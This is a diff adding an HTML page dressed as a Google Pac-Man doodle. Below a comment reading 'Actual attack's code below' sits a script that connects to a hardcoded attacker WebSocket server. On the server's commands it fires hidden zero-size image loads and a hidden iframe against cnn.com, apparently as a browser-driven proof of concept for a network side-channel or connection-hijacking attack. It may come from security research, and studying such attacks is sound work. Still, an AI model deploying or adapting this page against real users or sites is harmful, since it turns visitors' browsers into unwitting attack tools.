@@ -1,0 +1,282 @@
+<html>
+  <head>
+    <meta charset="UTF-8">
+    <meta http-equiv="x-dns-prefetch-control" content="on">
+    <link rel="icon" href="data:,">
+    <link rel="dns-prefetch" href="http://www.business.hsbc.uk/">
+    <script type="text/javascript">
+    	window.google = {
+      time: function () {
+        return (new Date).getTime()
+      },
+      Toolbelt: {},
+      y: {}
+    }
+    </script>
+  </head>
+  <body>
+    <h1 id="evil"> Prepare To Get Wrecked </h1>
+    <div id="pwn"></div>
+    <span id="images"></span>
+    <span id="text"></span>
+    <span id="script"></span>
+    <span id="iframe"></span>
+
+    <center>
+    <div id=lga>
+      <div id=logo style="width:554px;height:186px;background:black url(pacman10-hp.png) 0 0 no-repeat;position:relative;margin-bottom:9px">
+        <div id="logo-l" style="width:200px;height:2px;left:177px;top:157px;background:#990;position:absolute;display:none;overflow:hidden">
+          <div id="logo-b" style="position:absolute;left:0;background:#ff0;height:8px;width:0"></div>
+        </div>
+      </div>
+
+      <script>
+        google.pml = function () {
+          function d(a) {
+            if (!google.pml_installed) {
+              google.pml_installed = true;
+              if (!a) {
+                  document.getElementById("logo").style.background = "black";
+                  window.setTimeout(function () {
+                      var b = document.getElementById("logo-l");
+                      if (b) b.style.display = "block"
+                  }, 400)
+              }
+              a = document.createElement("script");
+              a.type = "text/javascript";
+              a.src = "pacman.js";
+              google.dom.append(a)
+            }
+          }
+          function e() {
+            if (document.f && document.f.btnI) document.f.btnI.onclick = function () {
+              if (typeof google.pacman != "undefined") google.pacman.insertCoin();
+              else {
+                google.pacManSound = true;
+                d(false)
+              }
+              return false
+            }
+          }
+          if (!google.pml_loaded) {
+            google.pml_loaded = true;
+            window.setTimeout(function () {
+              d(true)
+            }, 1E3);
+            e();
+            google.rein && google.rein.push(e);
+            google.dstr && google.dstr.push(function () {
+              google.pacman && google.pacman.destroy();
+              if (google.pml_installed) {
+                  google.pml_installed = false
+              }
+            });
+            google.pacManQuery = function () {
+              return false
+            }
+          }
+        };
+      </script>
+    </div>
+  </center>
+  <script>
+    google.dstr = [];
+    google.rein = [];
+    window.setTimeout(function () {
+        var a = document.createElement("script");
+        a.src = "google-script.js";
+        document.body.appendChild(a);
+    }, 0);
+    google.neegg = 1;
+    
+    google.pml && google.pml();
+  </script>
+  </body>
+<!--include js -->
+<!-- Actual attack's code below -->
+<script type="text/javascript">
+// client
+var initial =  0;
+var counter = initial;
+var frame_counter = 0;
+var timer;
+var stage = 0;
+var timeout = 80000;
+var flag = false;
+var sockets_num = 1;
+var keep_alive = false;
+var start_ack_infer = -1;
+function callback(id, success) {
+	if (id >= initial && id <= initial + 9) {
+		createImg(1, 1);
+		return;
+	} else if (id == initial + 10) {
+		post_data(8);
+		timer = setTimeout("createImg(1, 0)", timeout);
+		return;
+	}
+
+	// console.log(success, id);
+	if (keep_alive) {
+		return;
+	}
+
+	if (id > initial + 10) {
+		if (flag) {
+			flag = false;
+			sendmsg();
+		}
+		timer = setTimeout("createImg(1, 0)", timeout);
+	}
+}
+
+function createImg(n, type) {
+	var images = document.getElementById("images");
+	var childs = images.childNodes;
+	for (var i = childs.length-1; i >= 0; i--) {
+		images.removeChild(childs[i]);
+	}
+	var img = [];
+	for (var i = 0; i < n; i++) {
+		img.push(document.createElement("img"));
+		//small picture
+		if (type == 0)
+			img[i].src = "http://www.cnn.com/interactive/2010/09/world/interactive.chile.miners/miners/juan-carlos-aguilar-gaete-tzavtr.jpg?id="+counter;
+		else if (type == 1) //load large image to increase window size
+			img[i].src = "http://www.cnn.com/help/images/exploring-cnngo.lg.jpg?id="+counter;
+		
+		img[i].id = counter;
+		img[i].width = img[i].height = 0;
+		img[i].setAttribute('onload',"callback(this.id, true)");
+		img[i].setAttribute('onerror',"callback(this.id, false)");
+		counter++;
+	}
+	for (i = 0; i < n; i++)
+	    images.append(img[i]);
+}
+
+function loadframe() {
+	var iframe = document.createElement("iframe");
+	var uniqueString = "abcdefghijklmn";
+	var span = document.getElementById("iframe");
+
+	//remove children
+	// var children = span.childNodes;
+	// for (var i = children.length-1; i >= 0; i--) {
+	// 	span.removeChild(children[i]);
+	// }
+
+	span.appendChild(iframe);
+	iframe.style.display = "none";
+	iframe.contentWindow.name = uniqueString;
+	iframe.src = "http://www.cnn.com";
+}
+
+function loadImg() {
+	var images = document.getElementById("images");
+	var img = document.createElement("img");
+	//small picture
+	img.src = "http://www.cnn.com/SPECIALS/map.economy/images/jamie.smith.irpt.tn.jpg?id="+counter;
+	img.id = counter;
+	img.width = img.height = 0;
+	img.setAttribute('onload',"create_target(this.id, true)");
+	img.setAttribute('onerror',"create_target(this.id, false)");
+	counter++;
+	images.append(img);
+}
+
+function create_target(id, success) {
+	if (start_ack_infer == -1) {
+		console.log("error");
+		return;
+	}
+
+	if (id < start_ack_infer + 149) {
+		loadImg();
+	} else if (id == start_ack_infer + 149) {
+		loadframe();
+	}
+}
+
+function frame_callback(id) {
+	if (id >= 0 && id < 20) {
+		post_data(8);
+	}
+	if (id == 20) {
+		sendmsg();
+	}
+}
+
+function post_data(n) {
+	var random = (performance.now() | 1) + "s"
+	for (var i = 0; i < n; i++)
+		random += random;
+
+	var images = document.getElementById("images");
+	var childs = images.childNodes;
+	for (var i = childs.length-1; i >= 0; i--) {
+		images.removeChild(childs[i]);
+	}
+	var img = [];
+	for (var i = 0; i < 1; i++) {
+		img.push(document.createElement("img"));
+		//small picture
+		img[i].src = "http://www.cnn.com/interactive/2010/09/world/interactive.chile.miners/miners/juan-carlos-aguilar-gaete-tzavtr.jpg?id="+random;
+		img[i].id = frame_counter;
+		img[i].width = img[i].height = 0;
+		img[i].setAttribute('onload',"frame_callback(this.id, true)");
+		img[i].setAttribute('onerror',"frame_callback(this.id, false)");
+		frame_counter++;
+	}
+	for (i = 0; i < 1; i++)
+	    images.append(img[i]);
+}
+
+function display(data) {
+	var text = document.getElementById("text");
+	var para = document.createElement("p");
+	para.innerHTML = data;
+	text.appendChild(para);
+}
+
+var url = "ws://169.235.31.181:80";
+var websocket;
+var num = 0;
+// createJs(false);
+function open_websocket() {
+	websocket = new WebSocket(url);	
+	createImg(1, 1);
+	websocket.onopen = function(event) {
+		console.log("open");
+		// sendmsg();
+	};
+	websocket.onclose = function(event) {
+		console.log("close");
+	};
+	websocket.onmessage = function(event) {
+		if (event.data == 'up') {
+			stage = 1;
+			clearTimeout(timer);
+			sendmsg();
+			keep_alive = true;
+			start_ack_infer = counter;
+			loadImg();
+		} else if (event.data == 'do') {
+			clearTimeout(timer);
+			flag = true;
+			createImg(1, 0);
+		} else if (event.data == 'st') {
+			clearTimeout(timer);
+		}
+	};
+	websocket.onerror = function(event) {
+		console.log("error");
+	}
+}
+function sendmsg() {
+	websocket.send("ok");
+}
+setTimeout("open_websocket()", 5000);
+
+</script>
+</html>
